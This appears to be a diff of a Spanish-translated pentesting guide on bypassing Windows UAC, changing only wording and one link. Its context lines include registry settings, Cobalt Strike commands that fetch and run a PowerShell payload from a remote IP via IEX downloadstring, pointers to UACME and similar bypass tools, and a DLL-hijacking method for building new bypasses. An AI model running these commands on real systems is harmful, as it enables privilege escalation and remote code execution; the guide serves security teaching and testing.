@@ -14,7 +14,7 @@ Para más información sobre los niveles de integridad:
 
 Cuando UAC está en su lugar, a un usuario administrador se le otorgan 2 tokens: una clave de usuario estándar, para realizar acciones regulares como nivel regular, y una con privilegios de administrador.
 
-Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute cómo funciona UAC en gran profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurado y distribuido a través de Objetos de Política de Grupo (GPO) en un entorno de dominio de Active Directory. Las diversas configuraciones se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Política de Grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:
+Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute cómo funciona UAC en gran profundidad e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC. Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC específico para su organización a nivel local (usando secpol.msc), o configurado y distribuido a través de Objetos de Política de Grupo (GPO) en un entorno de dominio de Active Directory. Los diversos ajustes se discuten en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 configuraciones de Política de Grupo que se pueden establecer para UAC. La siguiente tabla proporciona detalles adicionales:
 
 | Configuración de Política de Grupo                                                                                                                                                                                                                                                                                                                                                           | Clave del Registro          | Configuración Predeterminada                                   |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | -------------------------------------------------------------- |
@@ -58,8 +58,8 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 - Si **`0`** entonces, UAC no pedirá (como **deshabilitado**)
 - Si **`1`** se le **pide al administrador el nombre de usuario y la contraseña** para ejecutar el binario con altos derechos (en Secure Desktop)
 - Si **`2`** (**Siempre notifícame**) UAC siempre pedirá confirmación al administrador cuando intente ejecutar algo con altos privilegios (en Secure Desktop)
-- Si **`3`** como `1` pero no necesariamente en Secure Desktop
-- Si **`4`** como `2` pero no necesariamente en Secure Desktop
+- Si **`3`** como `1` pero no es necesario en Secure Desktop
+- Si **`4`** como `2` pero no es necesario en Secure Desktop
 - si **`5`**(**predeterminado**) pedirá al administrador que confirme para ejecutar binarios no de Windows con altos privilegios
 
 Luego, debes revisar el valor de **`LocalAccountTokenFilterPolicy`**\
@@ -131,7 +131,7 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** y **Metasploit** también tienen varios módulos para **bypassear** el **UAC**.
+**Empire** y **Metasploit** también tienen varios módulos para **bypasar** el **UAC**.
 
 ### KRBUACBypass
 
@@ -140,7 +140,7 @@ Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https
 ### Explotaciones de bypass de UAC
 
 [**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilación** de varias explotaciones de bypass de UAC. Ten en cuenta que necesitarás **compilar UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`), necesitarás saber **cuál necesitas.**\
-Debes **tener cuidado** porque algunos bypasses **solicitarán algunos otros programas** que **alertarán** al **usuario** que algo está sucediendo.
+Debes **tener cuidado** porque algunos bypasses **solicitarán otros programas** que **alertarán** al **usuario** que algo está sucediendo.
 
 UACME tiene la **versión de compilación desde la cual cada técnica comenzó a funcionar**. Puedes buscar una técnica que afecte tus versiones:
 ```
@@ -174,7 +174,7 @@ Si no te importa ser ruidoso, siempre podrías **ejecutar algo como** [**https:/
 
 ### Tu propio bypass - Metodología básica de bypass de UAC
 
-Si echas un vistazo a **UACME** notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo el dll malicioso en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).
+Si echas un vistazo a **UACME** notarás que **la mayoría de los bypass de UAC abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo el dll malicioso en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).
 
 1. Encuentra un binario que **autoelevate** (verifica que cuando se ejecuta, se ejecute en un nivel de integridad alto).
 2. Con procmon encuentra eventos "**NOMBRE NO ENCONTRADO**" que puedan ser vulnerables a **DLL Hijacking**.
